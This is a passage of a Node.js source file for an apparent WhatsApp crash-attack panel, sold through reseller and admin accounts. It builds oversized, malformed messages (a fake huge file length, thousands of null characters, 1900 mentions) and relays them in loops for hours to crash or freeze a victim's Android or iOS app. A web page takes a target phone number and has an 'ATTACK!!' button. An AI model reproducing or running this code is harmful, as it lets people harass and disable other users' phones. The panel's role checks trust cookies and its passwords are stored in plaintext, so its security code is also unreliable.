            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    };

    const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
        mediaKeyTimestamp: 1758521043,
        isSampled: true,
        viewOnce: true,
        contextInfo: {
          forwardingScore: 989,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter",
            newsletterName: "Awas Air Panas",
            contentType: "UPDATE_CARD",
            accessibilityText: "\u0000".repeat(10000),
            serverMessageId: 18888888
          },
          mentionedJid: Array.from({ length: 1900 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=",
        annotations: [
          {
            polygonVertices: [
              { x: "0.05515563115477562", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.5867812633514404" },
              { x: "0.05515563115477562", y: "0.5867812633514404" }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "Awas Air Panas",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(5000)
            }
          }
        ]
      }
    };

    const msg1 = generateWAMessageFromContent(target, stickerPayload, {});
    const msg2 = generateWAMessageFromContent(target, audioPayload, {});
    const msg3 = generateWAMessageFromContent(target, imagePayload, {});

    await Ataa.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await Ataa.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await Ataa.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error("❌ Error di:", err);
  }
}

// ---------------------------------------------------------------------------\\
async function DelayAndro(durationHours, X) {
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 1) {
            await Promise.all([
            MediaInvis(X)
            ]);
            await sleep(2000);
            console.log(chalk.red(`
            ┌────────────────────────┐
            │ ${count}/10 Andro 📟
            └────────────────────────┘
`));
            count++;
            setTimeout(sendNext, 300);
        } else {
            console.log(chalk.green(`Success Sending Bug to ${X}`));
            count = 0;
            console.log(chalk.red("Next Sending Bug"));
            setTimeout(sendNext, 30 * 1000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}

// ---------------------------------------------------------------------------\\
async function DelayAndro2(durationHours, X) {
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 10) {
            await Promise.all([
            newsletterCrash(X),
            Crashh(X),
            SqlBlank(X)
            ]);
            await sleep(2000);
            console.log(chalk.red(`
            ┌────────────────────────┐
            │ ${count}/10 Andro 📟
            └────────────────────────┘
`));
            count++;
            setTimeout(sendNext, 300);
        } else {
            console.log(chalk.green(`Success Sending Bug to ${X}`));
            count = 0;
            console.log(chalk.red("Next Sending Bug"));
            setTimeout(sendNext, 30 * 1000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}
// ---------------------------------------------------------------------------\\
async function FcIos(durationHours, X) {
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 10) {
            await Promise.all([
            
            ]);
            await sleep(2000);
            console.log(chalk.red(`
            ┌────────────────────────┐
            │ ${count}/10 iOS 📟
            └────────────────────────┘
`));
            count++;
            setTimeout(sendNext, 300);
        } else {
            console.log(chalk.green(`Success Sending Bug to ${X}`));
            count = 0;
            console.log(chalk.red("Next Sending Bug"));
            setTimeout(sendNext, 30 * 1000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}


const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = "",
  successToast = false
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Deathles - Panel</title>
  <link rel="icon" href="https://files.catbox.moe/nv8rrj.jpg" type="image/jpg">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.0.0/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Orbitron:wght@600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Orbitron', sans-serif;
      background: #000;
      color: #3E33E1;
      min-height: 100vh;
      padding: 20px;
      position: relative;
      overflow-y: auto;
    }
    #particles {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 0;
    }
    .box {
      border: 1px solid #3A32CC;
      border-radius: 10px;
      padding: 20px;
      margin-bottom: 20px;
      background: rgba(0,0,0,0.4);
      position: relative;
      z-index: 1;
    }
    .logo {
      width: 80px;
      filter: drop-shadow(0 0 10px #432BE2);
    }
    .username {
      font-size: 22px;
      color: #3536D0;
      font-weight: bold;
      text-align: center;
      margin-bottom: 6px;
    }
    .connected {
      font-size: 14px;
      color: #2B2CE2;
      margin-bottom: 16px;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Poppins', sans-serif;
      text-transform: uppercase;
    }
    .connected::before {
      content: '';
      width: 10px;
      height: 10px;
      background: #25ff08;
      border-radius: 50%;
      display: inline-block;
      margin-right: 8px;
      box-shadow: 0 0 8px rgba(43, 44, 226, 0.6);
      animation: pulse 2s infinite;
    }
    input[type="text"] {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      background: #1a001a;
      border: none;
      color: #2B25D1;
      margin-bottom: 16px;
    }
    .buttons-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
      gap: 12px;
      margin-top: 20px;
    }
    .mode-btn {
      font-size: 14px;
      font-weight: 600;
      padding: 12px 16px;
      background-color: #1a001a;
      color: #4464F2;
      border: 2px solid #2E2BE2;
      border-radius: 10px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      transition: all 0.2s ease;
    }
    .mode-btn:hover { background-color: #08004A; transform: scale(1.03); }
    .mode-btn.selected { background: #2B46E2; color: white; }
    .mode-btn.full { grid-column: span 2; }
    @media (max-width: 500px) { .mode-btn.full { grid-column: span 1; } }
    .execute-button {
      background: #2E2BE2;
      color: #fff;
      padding: 14px;
      width: 100%;
      border-radius: 10px;
      font-weight: bold;
      border: none;
      margin-top: 20px;
      cursor: pointer;
      transition: 0.3s;
    }
    .execute-button:disabled {
      background: #000582;
      cursor: not-allowed;
      opacity: 0.5;
    }
    .footer-action-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      align-items: center;
      gap: 8px;
      margin-top: 20px;
    }
    .footer-button {
      background: rgba(138, 43, 226, 0.15);
      border: 1px solid #2B33E2;
      border-radius: 8px;
      padding: 8px 12px;
      font-size: 14px;
      color: #5866CC;
      display: flex;
      align-items: center;
      gap: 6px;
      transition: all 0.3s ease;
    }
    .footer-button:hover { background: rgba(138, 43, 226, 0.3); }
    .footer-button a { color: #395CF7; text-decoration: none; }
  </style>
</head>
<body>
  <div id="particles"></div>

  <!-- KOTAK BARU -->
  <div class="box">
    <div class="icon" style="text-align: center; margin-bottom: 15px;">
      <img src="https://files.catbox.moe/nv8rrj.jpg" class="logo" alt="Overload-X Logo">
    </div>
    <div class="username">WELCOME, ${username || 'Anonymous'}</div>
    <div class="connected">CONNECTED</div>
    <input type="text" placeholder="Please input target number. example : 62xxxx" />
  </div>

  <div class="box">
    <div class="buttons-grid">
      <button class="mode-btn" data-mode="androdelay2"><i class="fa fa-bug"></i> CRASH ANDRO</button>
      <button class="mode-btn" data-mode="androdelay"><i class="fa fa-bug"></i> DURATION DELAY</button>
      <button class="mode-btn full" data-mode="iosfc"><i class="fa fa-bug"></i> CRASH IOS</button>
      <button class="mode-btn full" data-mode="androdelay"><i class="fa fa-bug"></i> INVISIBLE DELAY IOS</button>
    </div>
    <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> ATTACK!!</button>
  </div>

  <div class="box">
    <div class="footer-action-container">
      ${userInfo.role === "owner" || userInfo.role === "reseller" || userInfo.role === "admin" ? `
        <div class="footer-button"><a href="/userlist"><i class="fas fa-users-cog"></i> Manage User</a></div>
      ` : ""}
      <div class="footer-button"><a href="https://t.me/XavieraXyy" target="_blank"><i class="fab fa-telegram"></i> Developer</a></div>
      <div class="footer-button"><a href="/logout"><i class="fas fa-sign-out-alt"></i> Logout</a></div>
      <div class="footer-button"><i class="fas fa-user"></i> ${username || 'Unknown'} &nbsp;|&nbsp; <i class="fas fa-hourglass-half"></i> ${formattedTime}</div>
    </div>
  </div>

  <div id="toast" style="display:none; position:fixed; top:20px; left:100%; background:#5a0092; color:white; padding:14px 24px; border:1px solid #8a2be2; border-radius:10px; font-family:'Poppins',sans-serif; font-size:15px; font-weight:500; z-index:9999; transition:left 0.6s ease-out;"></div>

  <script>

    const inputField = document.querySelector('input[type="text"]');
    const modeButtons = document.querySelectorAll('.mode-btn');
    const executeBtn = document.getElementById('executeBtn');
    let selectedMode = null;

    function isValidNumber(number) {
      return /^62\\d{7,13}$/.test(number);
    }

    modeButtons.forEach(button => {
      button.addEventListener('click', () => {
        modeButtons.forEach(btn => btn.classList.remove('selected'));
        button.classList.add('selected');
        selectedMode = button.getAttribute('data-mode');
        executeBtn.disabled = false;
      });
    });

    executeBtn.addEventListener('click', () => {
      const number = inputField.value.trim();
      if (!isValidNumber(number)) {
        showToast("Target tidak valid. Harus dimulai dengan kode negara dan total 10-15 digit.");
        return;
      }
      showToast("Success Sending Bug");
      setTimeout(() => {
        window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
      }, 1000);
    });

    function showToast(message) {
      const toast = document.getElementById('toast');
      toast.innerText = message;
      toast.style.display = 'block';
      toast.style.left = '100%';
      setTimeout(() => { toast.style.left = '5%'; }, 50);
      setTimeout(() => { toast.style.left = '100%'; }, 5000);
      setTimeout(() => { toast.style.display = 'none'; }, 5600);
    }

    function cleanURL() {
      if (window.location.search.includes('mode=') || window.location.search.includes('target=')) {
        const newURL = window.location.origin + window.location.pathname;
        window.history.replaceState({}, document.title, newURL);
      }
    }

    window.addEventListener('DOMContentLoaded', () => {
      const toastOnly = ${detail.toastOnly ? 'true' : 'false'};
      const toastMessage = ${JSON.stringify(detail.message || "")};
      const cleanURLFlag = ${detail.cleanURL ? 'true' : 'false'};
      if (cleanURLFlag) { cleanURL(); }
      if (toastOnly && toastMessage) { showToast(toastMessage); }
    });
  </script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> <
  script src = "https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js" > </script> <
    script >
    document.addEventListener('DOMContentLoaded', function() {
      particleground(document.getElementById('particles'), {
        dotColor: '#1E90FF',
        lineColor: '#283EE7',
        minSpeedX: 0.1,
        maxSpeedX: 0.3,
        minSpeedY: 0.1,
        maxSpeedY: 0.3,
        density: 10000,
        particleRadius: 3,
      });
    }, false);
  </script>
</body>
</html>
`;
};


// Appp Get root Server \\
app.use(bodyParser.urlencoded({ extended: true }));


app.get("/", (req, res) => {
  const username = req.cookies.sessionUser;
  const role = req.cookies.sessionRole;
  const isLoggedIn = req.cookies.isLoggedIn;

  if (username && role && isLoggedIn === "true") {
    const users = getUsers();
    const user = users.find(u => u.username === username && u.role === role);

    // Pastikan user ditemukan & belum expired
    if (user && (!user.expired || Date.now() < user.expired)) {
      return res.redirect("/execution");
    }
  }

  // Jika belum login / expired, arahkan ke halaman login awal
  const filePath = path.join(__dirname, "X7-System", "index.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  // Jika masih login dan belum expired, langsung lempar ke /execution
  if (username && currentUser && currentUser.expired && Date.now() < currentUser.expired) {
    return res.redirect("/execution");
  }

  const filePath = path.join(__dirname, "X7-System", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, password } = req.body;
  const users = getUsers();
  const user = users.find(u => u.username === username && u.password === password);

  if (!user || (user.expired && Date.now() > user.expired)) {
    return res.redirect("/login?msg=Login%20gagal%20atau%20expired");
  }

  // Cek apakah sedang login di device lain
  if (user.isLoggedIn && user.role !== "owner") {
  return res.redirect("/login?msg=User%20sudah%20login%20di%20device%20lain");
}

  // Set user sebagai login
  user.isLoggedIn = true;
    console.log(`[ ${chalk.green('LogIn')} ] -> ${user.username}`);
  saveUsers(users);

  const oneDay = 24 * 60 * 60 * 1000;

  res.cookie("sessionUser", username, {
  maxAge: 24 * 60 * 60 * 1000, // 1 hari
  httpOnly: true,
  sameSite: "lax"
});
res.cookie("sessionRole", user.role, {
  maxAge: 24 * 60 * 60 * 1000,
  httpOnly: true,
  sameSite: "lax"
});
  return res.redirect("/execution");
});


app.get("/userlist", (req, res) => {
  const role = req.cookies.sessionRole;
  const currentUsername = req.cookies.sessionUser;

  if (!["reseller", "admin" , "owner"].includes(role)) {
    return res.send("🚫 Akses ditolak.");
  }

  const users = getUsers();

  const tableRows = users.map(user => {
    const isProtected =
  user.username === currentUsername || // tidak bisa hapus diri sendiri
  (role === "reseller" && user.role !== "user") || // reseller hanya hapus user
  (role === "admin" && (user.role === "admin" || user.role === "owner")) || // admin gak bisa hapus admin/owner
  (role !== "owner" && user.role === "owner"); // selain owner gak bisa hapus owner

    return `
      <tr>
        <td>${user.username}</td>
        <td>${user.role.charAt(0).toUpperCase() + user.role.slice(1)}</td>
        <td>${new Date(user.expired).toLocaleString("id-ID")}</td>
        <td>
            ${isProtected ? `<span class="icon-disabled">
  <i class="fas fa-times"></i>
</span>` : `  
                <form method="POST" action="/hapususer" style="display:inline">
                <input type="hidden" name="username" value="${user.username}" />
                <button type="submit" style="margin-right:10px;">Delete</button>
        </form>
  `}
  ${(
  role === "owner" ||
  (role === "admin" && (user.role === "user" || user.role === "reseller")) ||
  (role === "reseller" && user.role === "user")
)
      ? `
      <a href="/edituser?username=${user.username}"><button>Edit</button></a>
      `: ""}
    </td>
      </tr>
    `;
  }).join("");

  const html = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Daftar User</title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Orbitron:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
  font-family: 'Poppins', sans-serif;
  background: #000;
  color: #3C44D5;
  min-height: 100vh;
  padding: 16px;
  position: relative;
  overflow-y: auto;
  overflow-x: hidden;
}

    #particles {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 1;
    }

    h2 {
      text-align: center;
      margin-bottom: 16px;
      color: #2B33DD;
      font-size: 22px;
      font-family: 'Poppins', sans-serif;
    }

    .table-container {
      overflow-x: auto;
      border-radius: 10px;
      border: 1px solid #2C2BE2;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(5px);
      font-size: 14px;
      margin-bottom: 20px;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 360px;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #263BEE;
      font-family: 'Poppins', sans-serif;
    }

    th, td {
      padding: 10px;
      text-align: left;
      border-bottom: 1px solid #2B2CE2;
      white-space: nowrap;
    }

    th {
      background: rgba(26, 0, 26, 0.8);
      color: #2B2EFF;
    }

    td {
      background: rgba(13, 0, 13, 0.7);
    }

    button {
      background: #2B4DE2;
      color: white;
      padding: 6px 10px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 13px;
    }

    .icon-disabled {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  width: 64px;
  height: 32px;  
  color: #ff5555;
  font-size: 18px;
  border-radius: 6px;
}

   .icon-disabled i {
  pointer-events: none;
}

    .back-btn, #toggleFormBtn {
  display: block;
  width: 100%;
  padding: 14px;
  margin: 16px auto;
  background: #000B82;
  color: white;
  text-align: center;
  border-radius: 10px;
  text-decoration: none;
  font-size: 15px;
  font-weight: bold;
  font-family: 'Poppins', sans-serif;
  border: none;
  cursor: pointer;
  transition: 0.3s;
  box-sizing: border-box;
}

    #userFormContainer {
      display: none;
      margin-top: 20px;
      background: rgba(0, 2, 26, 0.8);
      padding: 20px;
      border-radius: 10px;
      border: 1px solid #2B3BE2;
      backdrop-filter: blur(5px);
    }

    #userFormContainer input,
    #userFormContainer select {
      padding: 10px;
      width: 100%;
      border-radius: 8px;
      border: none;
      background: #01001A;
      color: #2748EC;
      margin-bottom: 12px;
    }

    #userFormContainer button[type="submit"] {
      width: 100%;
      padding: 14px;
      background: #2B61E2;
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      box-sizing: border-box;
      margin-top: 10px;
      font-family: 'Poppins', sans-serif;
    }

    @media (max-width: 600px) {
      h2 { font-size: 18px; }
      table { font-size: 13px; }
      th, td { padding: 8px; }
      button, .back-btn, #toggleFormBtn { font-size: 13px; }
    }
  </style>
</head>
<body>
  <div id="particles"></div>

  <div class="content">
    <h2>List User</h2>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th>Username</th>
            <th>Role</th>
            <th>Expired</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <button id="toggleFormBtn"><i class="fas fa-user-plus"></i> Add User</button>

<div id="userFormContainer">
  <form action="/adduser" method="POST">
    <label>Username</label>
    <input type="text" name="username" placeholder="Username" required>
    <label>Password</label>
    <input type="text" name="password" placeholder="Password" required>
    <label>Durasi</label>
    <input type="number" name="durasi" placeholder="Duration (days)" required min="1">
    
    <label>Role</label>
    <select id="roleSelect" name="role" required></select>

    <button type="submit">Add User</button>
  </form>
</div>

    <a href="/execution" class="back-btn"><i class="fas fa-arrow-left"></i> Dashboard</a>
    
<script>
  const currentRole = "${role}";
  const roleOptions = {
    owner: ["user", "reseller", "admin"],
    admin: ["user", "reseller"],
    reseller: ["user"]
  };
  const labels = {
    user: "User",
    reseller: "Reseller",
    admin: "Admin"
  };

  const allowedRoles = roleOptions[currentRole] || [];
  const roleSelect = document.getElementById("roleSelect");

  allowedRoles.forEach(role => {
    const opt = document.createElement("option");
    opt.value = role;
    opt.textContent = labels[role];
    roleSelect.appendChild(opt);
  });
</script>

  <script>
    $('#particles').particleground({
      dotColor: '#ffffff',
      lineColor: '#9932cc',
      minSpeedX: 0.1,
      maxSpeedX: 0.3,
      minSpeedY: 0.1,
      maxSpeedY: 0.3,
      density: 10000,
      particleRadius: 3
    });

    const toggleBtn = document.getElementById("toggleFormBtn");
    const form = document.getElementById("userFormContainer");

    toggleBtn.addEventListener("click", () => {
      const isHidden = form.style.display === "none" || form.style.display === "";
      form.style.display = isHidden ? "block" : "none";
      toggleBtn.innerHTML = isHidden
        ? '<i class="fas fa-times"></i> Cancell'
        : '<i class="fas fa-user-plus"></i> Add User';
    });
  </script>
</body>
</html>
  `;
  res.send(html);
});


// Tambahkan di bawah route lain
app.post("/adduser", (req, res) => {
  const sessionRole = req.cookies.sessionRole;
  const sessionUser = req.cookies.sessionUser;
  const { username, password, role, durasi } = req.body;

  // Validasi input
  if (!username || !password || !role || !durasi) {
    return res.send("❌ Lengkapi semua kolom.");
  }

  // Cek hak akses berdasarkan role pembuat
  if (sessionRole === "user") {
    return res.send("🚫 User tidak bisa membuat akun.");
  }

  if (sessionRole === "reseller" && role !== "user") {
    return res.send("🚫 Reseller hanya boleh membuat user biasa.");
  }

  if (sessionRole === "admin" && role === "admin") {
    return res.send("🚫 Admin tidak boleh membuat admin lain.");
  }

  const users = getUsers();

  // Cek username sudah ada
  if (users.some(u => u.username === username)) {
    return res.send("❌ Username sudah terdaftar.");
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;

  users.push({
    username,
    password,
    expired,
    role,
    telegram_id: req.cookies.sessionID,
    isLoggedIn: false
  });

  saveUsers(users);
  res.redirect("/userlist");
});

app.post("/hapususer", (req, res) => {
  const sessionRole = req.cookies.sessionRole;
  const sessionUsername = req.cookies.sessionUser;
  const { username } = req.body;

  const users = getUsers();
  const targetUser = users.find(u => u.username === username);

  if (!targetUser) {
    return res.send("❌ User tidak ditemukan.");
  }

  // Tidak bisa hapus diri sendiri
  if (sessionUsername === username) {
    return res.send("❌ Tidak bisa hapus akun sendiri.");
  }

  // Reseller hanya boleh hapus user biasa
  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya bisa hapus user biasa.");
  }

  // Admin tidak boleh hapus admin lain
  if (sessionRole === "admin" && targetUser.role === "admin") {
    return res.send("❌ Admin tidak bisa hapus admin lain.");
  }

  // Admin/reseller tidak boleh hapus owner
  if (targetUser.role === "owner" && sessionRole !== "owner") {
    return res.send("❌ Hanya owner yang bisa menghapus owner.");
  }

  // Lanjut hapus
  const filtered = users.filter(u => u.username !== username);
  saveUsers(filtered);
  res.redirect("/userlist");
});


app.get("/edituser", (req, res) => {
  const role = req.cookies.sessionRole;
  const currentUser = req.cookies.sessionUser;
  const username = req.query.username;

  if (!["reseller", "admin", "owner"].includes(role)) {
    return res.send("🚫 Akses ditolak.");
  }

  if (!username) {
    return res.send("❗ Username tidak valid.");
  }

  const users = getUsers();
  const user = users.find(u => u.username === username);

  if (!user) {
    return res.send("❌ User tidak ditemukan.");
  }

  // 🔒 Proteksi akses edit
  if (username === currentUser) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  if (role === "reseller" && user.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  if (role === "admin" && user.role === "admin") {
    return res.send("❌ Admin tidak bisa edit admin lain.");
  }

  // 🔒 Tentukan opsi role yang boleh diedit
  let roleOptions = "";
  if (role === "owner") {
    roleOptions = `
      <option value="user" ${user.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${user.role === "reseller" ? 'selected' : ''}>Reseller</option>
      <option value="admin" ${user.role === "admin" ? 'selected' : ''}>Admin</option>
      <option value="owner" ${user.role === "owner" ? 'selected' : ''}>Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user" ${user.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${user.role === "reseller" ? 'selected' : ''}>Reseller</option>
    `;
  } else {
    // Reseller tidak bisa edit role
    roleOptions = `<option value="${user.role}" selected hidden>${user.role}</option>`;
  }

  const now = Date.now();
  const sisaHari = Math.max(0, Math.ceil((user.expired - now) / 86400000));
  const expiredText = new Date(user.expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit",
    hour: "2-digit", minute: "2-digit"
  });

  const html = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Edit User</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
  font-family: 'Poppins', sans-serif;
  background: #000000;
  color: #423EC8;
  min-height: 100vh;
  padding: 20px;
  position: relative;
  overflow-y: auto; 
  overflow-x: hidden;
}

    #particles {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 2;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #402BE2;
      font-family: 'Poppins', sans-serif;
      text-shadow: 0 0 8px rgba(43, 81, 226, 0.7);
    }

    .form-container {
      max-width: 480px;
      margin: 0 auto;
      background: rgba(0, 0, 0, 0.7);
      border: 1px solid #522BE2;
      padding: 24px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(46, 43, 226, 0.5);
      backdrop-filter: blur(8px);
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #26359B;
      font-family: 'Poppins', sans-serif;
    }

    input, select {
      width: 100%;
      padding: 12px;
      margin-bottom: 18px;
      border-radius: 10px;
      border: none;
      background: #1a001a;
      color:#4533D0 #4F2DCA;
      box-sizing: border-box;
    }

    .expired-info {
      margin-top: -12px;
      margin-bottom: 18px;
      font-size: 12px;
      color: #aaa;
      padding: 12px;
      background: #1a001a;
      border-radius: 10px;
      width: 100%;
      box-sizing: border-box;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #472BE2;
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      box-sizing: border-box;
      margin-top: 10px;
      font-family: 'Poppins', sans-serif;
    }

    button:hover {
      background: #4032CC;
      transform: scale(1.02);
    }

    .back-btn {
  display: block;
  width: 100%;
  padding: 14px;
  margin: 16px auto;
  background: #040082;
  color: white;
  text-align: center;
  border-radius: 10px;
  text-decoration: none;
  font-size: 15px;
  font-weight: bold;
  font-family: 'Poppins', sans-serif;
  border: none;
  cursor: pointer;
  transition: 0.3s;
  box-sizing: border-box;
}

    .back-btn:hover {
  background: #2a004a;
  transform: scale(1.02);
}

    @media (max-width: 500px) {
      body {
        padding: 16px;
      }

      .form-container {
        padding: 16px;
      }

      input, select {
        padding: 10px;
      }

      button {
        padding: 12px;
      }
    }
  </style>
</head>
<body>
  <!-- Efek Partikel -->
  <div id="particles"></div>

  <div class="content">
    <h2>Edit User: ${user.username}</h2>

    <div class="form-container">
      <form method="POST" action="/edituser">
